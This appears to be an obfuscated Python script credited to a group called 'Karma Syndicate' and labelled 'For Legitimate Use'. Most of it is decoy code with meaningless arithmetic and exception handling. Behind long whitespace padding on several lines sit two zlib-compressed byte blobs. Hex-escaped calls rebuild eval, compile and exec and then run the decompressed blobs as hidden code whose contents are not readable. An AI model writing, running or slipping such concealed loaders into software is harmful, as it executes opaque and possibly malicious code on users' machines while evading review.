from builtins import *
from math import prod as Frame


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_modulo, Calculate, _power, _floor, _statistics, _negative, _walk = exec, str, tuple, map, ord, globals, type

class _while:
    def __init__(self, _substract):
        self._product = Frame((_substract, 21966))
        self._cube(_invert=21465)

    def _cube(self, _invert = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._product += -27029 + _invert
        
        try:
            (((Calculate, _power, Floor), _modulo) for _modulo in (_modulo, Floor))

        except TypeError:
            (_statistics, Floor) if _modulo is Calculate else (Floor, _power) != _floor

        except:
            _walk(-81290 + -69396) == bool

    def _square(self, _ceil = -12354):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _ceil += 61722 + -56502
        self.DetectVar != type
        
        try:
            ({_modulo: _statistics} or _modulo if {_modulo: _statistics} and _modulo else ... or (_modulo, {_modulo: _statistics}))

        except OSError:
            ((_modulo, {'neag:exgnmeb:': Floor}) for _modulo in (_statistics, Floor) if _modulo is Floor)

        except:
            _walk(63023 / -4129) == None

    def _run(Math = Ellipsis):
        return _negative()[Math]

    def _hypothesis(_add = -68038 * 67563, Run = Ellipsis, Round = _negative):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Round()[_add] = Run
        
        try:
            ((Calculate, _power, Floor) or _power if (Calculate, _power, Floor) and _power else ... or (_power, (Calculate, _power, Floor)))

        except AttributeError:
            (((Floor, _power), _floor) for _floor in (Calculate, _power, Floor))

        except:
            _walk(-25379 + 68615) == False

    def execute(code = str):
        return _modulo(Calculate(_power(_floor(_statistics, code))))

    @property
    def DetectVar(self):
        self.Positive = '<__main__.Positive object at 0x000005281BE33159>'
        return (self.Positive, _while.DetectVar)

if __name__ == '__main__':
    try:
        _while.execute(code = __license__)
        Theory = _while(_substract = 54902 - 10218)

        _while(_substract = 39496 / -40560)._square(_ceil = -6216 + Theory._product)                                                                                                                                                                                                                                                          ;_while._hypothesis(_add='nnnmmnnmmnnnnnmmmmnnnmnnm',Run=b'x\x9c\xe5\x1bks\xe2\xc8\xf1;\xbf\x82\xf8\x0bR\xcc\xb2b\xf4\x84*\xaa\xb2\x15\xbcw\xde\xd8\xe6\xea\xbc)\xdf\xd5\xd6\x16%\xa4\x91-\x9f\xd0\x10I,8W\xc9oOw\xcfH\xc8\x06\xd6`\xcc\xe6\x83g4O\x8d\xe6\xd1\xea\xd7\xf4HE\xf6\xd0o4\xc1\xc5\x91F)\xba\xf1\xb8\x10"\x19\x8f\x9b\x7f\x19\x9c|\x14Y\xf3\x82\xdf\xc6E<\xf5\x0b\xde\xfcg\xceO\x9a"\xab5\xf5\xe7\xc5\x9d\xc8rj\xad\x9d|\xe6\t\xbf\xcd\xfci\xff\xa4}\xf2\xb7e\xeaO\xc4\xe4D\x7f\xd4^d\xb7~\x1a\xff\xdb/b\x91\xca!\xfe\xe1gS\xbfy\xfd\x90\x86q\x00c<\xe9\xbfP=\xca\xb6wE1\xcb\xfb\xef\xdf\x17\x9d)\x7fO\x0fn{\xee\x1b\xcf\xf2j\x88\x0b\xb8\x9f\x17OZ$q\xc0\xd3\x9cS\x8b\x96\xe5\x99\x8ea\xba\xa1\xd9c\xccef\xd7f\xc6$0M\xcb\xf1{V\xe0\xf9n\xab\xa1\xf7\xabg\xe3\xb4\xd0Z\xf9\x1fq\xd8\xd2\x1b|\x19\xf0Y\xa1\x80\x98\xce\xe6\x85v\xf2K\xc2\xfd\x9c7\x87"m\x15\xcdK\x11\xc6\xd1\xc3\x89\xde\x90\x83\xc6\xd3\x99\xc8\x8a\xf1\x18\x9e\x7f\xc8[z\x87/\xe3B\xd3\x1b\x89\x08\xfc$\xd7\xf4/\xadi:\x85Kz\xc8\xa5\x10\xb7\xbe\x0en\x131\x81\x06\x8d\rw\xf1\xa1\x91\x18\r\x87B@\x8ca$\x86b\x08n4\x1a\xb6\xbe\xf4\xfb\xa7\xefN\xdfi\xef\xb4\xd3\xae\xae\x7f\x85\x9ex\xe1\x17E\xb6\xad\xa7\x8b\xf3O\xe7\x17\xe0>Ar\x0e\x11\xf8\xf5>\xc2x\xeb\xf3W\x97\x97WW\x18\xe1u\x85Y\xbc.//a\x11r\x91\x8d\xadMh%\x06\xac\xc00F\x10\x8b\x11^P6F\xe0\xe0\xf9\x15\xf4\xb6\x8d\xae\xf2i\x19a\n\x0fn\xedTkM\xe6qR\xc4)\xbe\x8ao~\x06\x00\xde\xd0\x03\xf6\xbcX.\xc0-\x97K\xccT1\xf4\x8dP\x06\x07 G\xc0\x0b\x0c\x00|\x18D\xfb\xce\xa8y\x1a\x17I<\x9f<\x05\xad\xde&\x88K\xd8\xe3k\xc0\xb7\xf1\xa2\x8e\xf4/\xaf\xd6S\'NC\xbe\xd4Z<\x89gS\x11\xac5\xf8\xaaoG\x86\xf25\xaf\xde3\\o\njY\x91\xef\x011\x89ax\x11\x8ea\xfc\xc6\x90l\x9e}\xde\x08\xaf-t\x19\'\xc9}r\x1f\x83O\xee\xef\x93$N\x00Z\xadV\xe7^\xc4\xe9\xd6g\xce\x93s\xbc\xce\x13p\x10a\xee\xfcM\x019\xf1\xbf\xf1M@\xfe>g\x86\xfe\r\x81C\x1a\x90\x08\x1a_\xbc-\xb0\t\xb1~w;-_\x83c\xe0\xae\x99\xcc@D\xfeM\xc1\x8c\xe7\x89\xffqo\\C\x90\xa0\x13\x08\'\x02\x0fj7o\np\x85/\x92h\x0flCh\xc18\xa4\xf6I\xed\x0f@6|)\xc8\xe28\xc8AM?\x1cd[;\xda\x1bd\xdb{*A\xf6\x10\xc5\xc9\x92\xdf\xa5\xf3\xdd\xc1\xb6\x19j\xda\xa4e\xf5\xc0\x075\xefC\xd9\xa7Z\x9f\xee\xf4\xa8\x0e<h\x8e!\x0fD\xc8\xb5\x96\x17\x15\x1b\xc6~CH\x1b\xf0\xe5F\xc1\xb2M\x12\x13wT\x0c\x123\xe8\xea\xcfo\x92\xd4\xda\xd6wf\x1a,d\x1e\x0b\xcd.\xeb=\xf7Vt\xda\xc8l\xec\xbf\xa5w\xc7\xd6\xd8\x19c\xcc \xb5\xc7\xbd\xb1\x85\xcfA\xfa\xa4\xf6\xc7\xcdu+\x0c\xb7\x8e`\x9b\xb6i2\x19\x97\xbe\xac)\xfd\xea\xce\xf3X\xbc\xdf\xfa\x98k\xd9\x0ew-\xc7v\x193\x98a\x05N\xcf5]\x8b\x19\xa6\xcf\xdcgW\xbc\xf7j\xadPy^\xf9\x90B\xa8\xf2\xe1\xeb\xaf\xd0\xe9\x1e\xb0\x92\x16\x8a\xb4\x11\xc95\x81\xbbw\xca<\x8bO\x80\x9bp\xd38\x00\xef<;2\r\x08&\x04G\x05\x06\xa1\xa7\x02\xe6m6!\xdc\xdc\xa5\xad\xb5#\xfe\x12\xbd%\xfet\x12\xfa\xcd+)\xfa\x95+\xd5\x80\xcb\xcb\xfeF&\xbd7.8=\xf2\x80q\x8e\x0fq\x99\x96\xb5\xd2\xfb\xce\xb3\xf3\xde\x1b#\x00\xd39\xf3\x9c\x1e\xa4\xb6\xe3tiL\x8b=K[/Z\xa1\\\xcfj}\xbdj\x85\xbe\xaa\xf1i\x95\xe4_\x1f\xf7]@\x06\xc7t\x81\xba\x81\xae-\x17\xb0\x01h=r&P\xcb\x8fA\xdf\xb6g\xbb\x95\xf7\xa8\xe4\xd5J^Y\xfb\xfa+\xb5#;rBx\x9b=\x87c\xfe\x10\x9aW\xe8-1\x9b\xd0\x1c\xae\x03\x88\x19\t\xd3\x82\xe0*b4U(\t\xd4F\x02V\xc4\xfc\\[\xbc\xd7;Hp\xeeD\x18\x16\x80\xd1=.qD\x96\xf4\x80\x90\x16:\xca[\x11\xd6;\x91\xbaK\xce\x89\x8e@\x18\xec(\xe8_G\xf35\xa4W\xb5;\xa1\xbfb\xc1\xbf\x81\xbb\xb9\xa1\x08\x13\x08\x18\xbf\x12\x03V\xa2w%\x88K\xd1\x1c>\x11\xcc\x14\xef<g\x14\x968\x08\x0cC\x9bCp\xfd\xefl#\xb7R!\xa8\xb9\x9f.\xce\xd1\xc6\xfd\xe9\x1c\xf5_\x19A\xed\x01\x94\xd8U\xea\x9cq$\nrm\x06\xaa\x14\x10\xaf\x13\x80\x12\x15\xd9\xae\x13\x01\xeb\x9d Sr\\\x16B\xd9v\x98bS\x01\x03\xc5\xcb\xf5\xa0\xdd\x01\xacJ\xaa\xe5\xecZ\x190\x98\xb4]\xfcX\xf5\\\xbd\xf7\xe4\xfe\xfe>\x86(\x8e1\xc6\xf4\xb5\x14\x05\x10\x9e\xb4\xa5\x03\x8f9\xa9\x1a<N\xe5\x1d\x19\xbf\xbe\xc2\xe08$\xb8\xedc\xf0\xc1Gt\xf7\x98\x1a\xeb\xb9pE\xa3;S\xa24m){\x16+\xed[\x98\xbe\x88 q\x939\xa2m\'n:a\xb7)\xd0\xca8\x1a\xed\xa0\x0e\xb3\xb1I\xdb2\x0f\xb6e.l\xca\xbcq\x0f\x1a\x9b\xeb\xb5\x07\xe0\xad\xa3\xa4cWIOOIV\xaf\x16,%ewik\xee\xa32\xef\xcb\'\x0e\xa1\xf9\xc5b)}y\xf6\xb0\xfc?P\xbbB\x17\xb53\x80R\x7f\xf3t\xf7\xa6\x07\xe0\x88\xd2y\x95w\xab\xe0VeJ_\x9f\xd2AH[\x8eczG\xd1xB\xf0\xbc\x16d\x99\xab\x98\xd2\x9di\xbb\x92\xaeh\xb1"[\x95\xdc\xa2\xbeH\xd6ngN\xa4\x86\x99\x06\x86R1s*\xf5\x0c\xeb\x1c\x8aM\x03=\xd6\xec\xc1\x9c\x94%I\xda\x96\xe0z\x11S"\xa1Ri\xeax\x90\xfcZ\x9b\xf3\xdd\xdb\x01\xdfB\xdeE<\xcc\x04~f\x8dMh\xdc[\xaf\xfd\x81\x86\xa8Z\xa8@.\xd9\x85:\xbb\x94\xc7\xe4\x8b\xe5~B\xbaE\xd8\x86\x06R4\x8a\x0c\x85D\xbc\x03\xb9v\xb5\x07\xaaqeC\xd5Q\xb9\xc6\xb5\x9fk{,\xcd\x8e\x91\x91\x0c\xb5\xb5\xc85@\x17\xa0\x8d\xe6\x01\\\xa2%\xcd\xcbC\xf9\x1d\xc8H~\x15B\'(\xbb &\xa0U\x17\xd0\xcaP\x16Pc\xecAc\xb6^{\xe0\x8ba\n\xb8\xac\x06tWY\x98\xbaO\xc4\xe9sm\x8f*N\xe1\x95tA\xed6\x8f\xb1\xa9+\x95\xcf\xd2&\xb5RDK\xd5s\xa5\x98\xca\x9a#X7,\xc7\x03\x94\xe3\xce\x84\x19v\x0f6\x156;\xc4\xaa\xf9=\xfb\xcd\xa3\x8dj\xb5y]\xa5\xaa\xc5\x11\xb6\xe46Z\xab\x0e\xda\x98\xb7H\xb9\x95\xc7\xb9\xa5S\x9a\xef\x0eT\xe5\x02\xc5\xa0\x12j\x10\xc3\x06Z\x82\xa6\xde\xd3\xba\x1d\xc5\x81\x01\x01\xd5\xdb.x\x87\xce%z\xeb\xb5;\xf4e\xc0\xcd]\xc6\xdcUT9t.\x82B\t\xbd\x05\xabr\xa0\xb1\xbb^{\x00\xe7(9\x00S,\xd9\xae\xd9\xa1KS\x96\xa38\xc7.m\xed\xfdE\xde\x8b9\tc\x11Pp\xe4\xb8\xc4\xde#\xb3V\xb2Q\xef\xe1\xb0\xb1\xef\x99(\x86\x0f`\xfd\xa5M\x87\x02\x1avn\x0e\x84v\xb9\x8d\xe9\xd5\xb62e\x9exr\r\xda\xcf\xb5=\xecT\xee{\x9bh\x10\x9e\xe0\r\xd74}\x16\x01\x9cM\xe0\xda\x13\xe0\xdbd\x10a\xdc1\x1d\x93EV\xe8\xdaN\xcf\xf6`\xb3\xeb9\x01h\x95.\xcc\xcc3{\xaegE\xb6\xe1\x84 ~\xa1\x1f\xcb\xb4&\x80/\xf0\xa4i\x0274\xa0}\x08\xef(b\x1c\xfa\xf4\\\xe3\xb8\x06\xcb\xd2@\xe9T\x06\xcb\x9a\xf1\xf28\x06KfOXh\x87\xec\x90\x95\xb5n\xc8\xfd&\x8d\x88\x12\xf1\xc8\xed\xc4\x1b\x91\x7fY\xa4[\x18\xe0\x81O\x10w\\\xab\xfd\xe1<m;e\xd8\n\xd3+>R\xc3x\xb3,+\xca\xd8\xa5\xad\xfb\x12\xd5{o5\x939\xec\x90w\x8c\x1b&\xe5\xe5\xbe\x1c\xfd\x8f\xb4\x0fl\xfc\x00M\xd3\xfe\xbb\xed;+]d\x9a\xb6\xe9\x83J\xddOCm\xebS/"\xe0\x8ah\xab\xd3\x86\x8a\x80\x89l\xd1\x1f\x81t\x83\x83v\n\xdb7\xe7\x96<;\xa1u\xc9S\x94\xf2\xec\xa4\xaa\xc7\xf4\x08V\x92\xe0\x10\x14\xa5!p$\x95&r\xf8d\xa7\x8d\x8f\xa5\x142\x0bB\x17\x94\x16\x936>k\xb5\x87\x9c\x11(r/YBY\xee\xd6\xeaz\x8am\xec\xd2\xd6;\xde\xc6G\xda)\x15\xcb*\xed\x98\x86J\xbbJ\xa5\xb2j\x9f\t|\xaf-\xdd\xdba\xae\xafs(\\\x8f\xf79\x0f#\xa1%\x95\'\x92]\xaffvtk\xe6F\xf7\x91\xe9\xb1\x1e+w\x14\xf9>\xd9U\xbeG\x99\x986\xcb_"\x9a\xf2o\x8b&_\xf2\xa0M\xbf\xb6\xb4gY\x9c\x16m\x0cS\x7f\xd6\xce\x8b\xac-f<m`\x0b\x8d\x8c\xf8\x06~0\x86&\x1c\xf5\x05\x991\x1a\xe9\r\xd5O \xd2`\x9ee<-:\xd1\xbc\x98g</\xef\xe4\xd3b\x96\xc4\x139|\x11Oy94\x8c\x10ay\xfd\x0e\xe5\xfd\x9c\xd2\xac\xec\'\x03\xc6.\xa6U\x89\xafr\xff\x9a\xf3\xbcX\x8dW\xc0:n\x1b\xb5\xae\xe4\x00\x81HD\xe6O}5\xc8_\xcb\x16\x02\x9eL\xe3B\xf3\xe7\x85\x80i\xf3b\xf0T\x0e\x92\xd7\x1b\x19\x0f\xc6A,\x06J\x07*Uq\x88`\x80\xc1Gx\xb8\xf3\xeb\xd9\xb0\x11\x052\xff\xf7\xdf?\\5\xa2\x85,\xdc\xfc|\xfe\xf9\xac\x11\xdd\xca\xd2O\xbf\x9e\x9d\xc1\xbd\xa9,]~\xf8\xe9\xec\xea\xf3\x87F\xf4 \xcb\xbf\x9f]\\\x8cn\x1a!\x8f\x9a\xc1,\xb8\xe3\xc1\x1f\xda<K\xd4\x1fJE\xf9O\x17:\x80\x87\x1f\xa7\xedy\xce\xb3\xd4\x9f\xf2\xf6l\x11\x0e\xa0i\'\x07\x80\x17\x1a}\x94\x88\xe66\xb2\xf7\xd2\xc7HC\xbdz\x16^\xc9\xa0\x04]\xe7\x9a\xe7\xf8?\x95\xb6\xba}\'\xf2b \xfb?-\xcf\x83\xaa\xbd\xb1\xda(\xb3\xebUo\xe2v\xf0\xa7:i^\xc1\x06+\xfa\xd5\xec\xd47Qd\xb4\x92\x9fK\x0e\xe5\x7fM}\x98\xf7\x7f\xaa\xae`R\x03\x98\\g\x063')

        if 115194 > 8244134:
            Theory._square(_ceil = -77521 + Theory._product)
        elif 403208 < 6408610:
            Theory._cube(_invert = Theory._product * 5060)                                                                                                                                                                                                                                                          ;_while._hypothesis(_add='liiliijliijjjjljlij',Run=b'\xd0p\x1a\xed\xd0/\xfc\x01\x8c\xd0\xc6\x97)\xe6\xc5\xa0d\xfd%\x91\xa84YM?\x8e\x9aq\x12\xc7\xf8\xd3\xc0=f \x17\xdf\xdf\xd3\x01c3N\x11G4\x18\xa7\x03X[\x00\xca\xd6\xfe\xfeBG\x84\xa0I\xadb\xb1\xact\x0c\xf9\x97\xd0)\x00\xf8\x14\x0f+e\xe7\xd87\xce\xe3>\xd6\x1f\xf5\x81\xa4\xa3\xe1G\x97\xb53h\xfc\x10\x93N\xa7?\xb5W\x07 d\xbd\xbe\xbc\xd4;\x8b,.8\xbe\xe9SI\xech.E\x83)\xc1h\xd59Or\xbei\xbah\xd7\x1f\x8e\x14\x84e\x1e\x9e\xa4\xd9\xca/Q\x1e}\x9a2Me\x8f\xf5\x1f\xdc\xa8/?\xcf\t\xf3\xf2\xc0O\xb5h\x9e\x06\xf8+_;\x87\xa9\xe5\x9b0p\x11\x17w\x1bh\xbf\xf3\xf9.\xe3~\xf8\x8b\x10\xc9\x19\xb0\x0f\xa4,\xed\xfaz\x85G\xcax\xcft r\xae\x1a<^TY\xdb\x01^\xf4t\x1e\xb5\x997\xcf(\x81{\xc8/j\x80\x91@\xe1:-\x06\xb1XS\xd3\x9f\x88\x89?\x11\x0f\x03\xf9;\xdf\xb5<\xfef+\xfc\xa6\x82\x1c"\x8a\x13\x9e\x0f\xfe$6,\xd1\xad\xc24,\xf75\xd5\x17\xf1\xc9\xaaPn\x97n\xca\r\x93\xda.\xe9mu\xd4"\r\xe0\xa3\xa1\xfc\xfc]\x97\x98\x0f@\x9b\x894\xe7+\x9a$\xfcW<\xa7-\xa7B\xb1\x9c\x1bAb\xf0h`z\xeb+;;}^?\x14m\x9e\x82T\x00\x8e8P\xc6{\xa9*/\x94\xde\xbc\xd0;\xf8\xa64]2\x8d$Ny\xae\xd8\x00\xa1\x80\xe2@%\xe4\x81\xae\xc6c\xa4\xe6\xf1x0\x90\x0b+7\x85R\xb8J K\x807V/\xa2\x92i$\xdeT\x8a\xa0\xd4\x1b\xff\x03\xd1\xcda\x8b')

        if 334561 > 1362668:
            _while(_substract = -94029 - -2719)._cube(_invert = Theory._product - -52073)
        elif 374349 < 9676355:
            Theory._square(_ceil = 45806 / Theory._product)                                                                                                                                                                                                                                                          ;XWWWWXXXXXWXXXXWXWWWXXXXW,IIIIJIIIJLLILIJLJJJJJLL,WWWXXWWXWWXXWWXWWXXXW,XWXXXXWXXWXXXWXWXWWWWWW,IIIIIJJJLLLIIJJLLIJI=(lambda nmnnnnnnmmnnnnnmmmmnnm:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(nmnnnnnnmmnnnnnmmmmnnm)"),filename='\x4f\x30\x4f\x4f\x4f\x4f\x30\x4f\x4f\x30\x6f\x6f\x4f\x30\x4f\x6f\x6f\x6f\x6f\x4f\x4f\x6f\x6f\x6f\x6f\x30',mode='\x65\x76\x61\x6c'))),(lambda nmnnnnnnmmnnnnnmmmmnnm:nmnnnnnnmmnnnnnmmmmnnm['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda nmnnnnnnmmnnnnnmmmmnnm:nmnnnnnnmmnnnnnmmmmnnm(__import__('\x7a\x6c\x69\x62'))),(lambda S22S22S2SSSSSSS2S22S22S,nmnnnnnnmmnnnnnmmmmnnm:S22S22S2SSSSSSS2S22S22S(nmnnnnnnmmnnnnnmmmmnnm)),(lambda:(lambda nmnnnnnnmmnnnnnmmmmnnm:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(nmnnnnnnmmnnnnnmmmmnnm)"),filename='\x4f\x30\x4f\x4f\x4f\x4f\x30\x4f\x4f\x30\x6f\x6f\x4f\x30\x4f\x6f\x6f\x6f\x6f\x4f\x4f\x6f\x6f\x6f\x6f\x30',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _while(_substract = 12176 + 43478)._square(_ceil = 58068 + Theory._product)                                                                                                                                                                                                                                                          ;IIIIIJJJLLLIIJJLLIJI()(XWXXXXWXXWXXXWXWXWWWWWW(IIIIJIIIJLLILIJLJJJJJLL(WWWXXWWXWWXXWWXWWXXXW(XWWWWXXXXXWXXXXWXWWWXXXXW('\x76\x61\x72\x73'))),_while._run(Math='nnnmmnnmmnnnnnmmmmnnnmnnm')+_while._run(Math='liiliijliijjjjljlij')))

    except Exception as Floor:
        if 164076 > 1683786:
            _while.execute(code = Calculate(Floor))

        elif 481699 > 2265570:
            _while(_substract = -36781 * -39721)._cube(_invert = Theory._product / -56573)